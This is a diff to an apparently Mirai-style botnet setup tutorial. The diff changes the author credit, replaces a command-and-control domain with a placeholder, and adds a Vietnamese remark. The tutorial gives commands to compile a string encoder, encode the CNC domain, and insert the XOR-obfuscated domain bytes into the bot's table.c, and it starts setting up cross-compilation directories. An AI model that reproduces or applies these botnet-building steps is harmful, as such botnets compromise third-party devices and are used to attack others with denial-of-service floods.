@@ -1,4 +1,4 @@
-TUT made by zxcr9999
+TUT made by creytdeptrai
 
 // Copy and paste all to ur shit vps
 
@@ -33,16 +33,17 @@ bot/util.c
 // added domain
 drag file enc.c to ur vps and type command
 gcc enc.c -o enc -std=c99
-./enc string botnet.nguyennghi.info
+./enc string botnet.xxx.com
 and add TABLE_CNC_DOMAIN in table.c file
 "botnet.yourdomain.com" is your domain, and it is connected to the IP to host the botnet
 
 add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0\xbb\xaf\xa4\xb5\xf3\xf1\xf3\xf0\xef\xac\xad", 17);
-
+( phần add này đến file table.c để thay thế bạn nhé, nhớ để ý không phải cài lại đấy
 number 17 will correspond to xor bytes
 
 
-\x4C\x41\x5A\x40\x4B\x5A\x00\x1A\x49\x5D\x5E\x4B\x4B\x4A\x00\x43\x4B\x2E
+
+\x4C\x41\x5A\x40\x4B\x5A\x00\x1A\x49\x5D\x5E\x4B\x4B\x4A\x00\x43\x4B\x2E
 mkdir /etc/xcompile
 cd /etc/xcompile
 
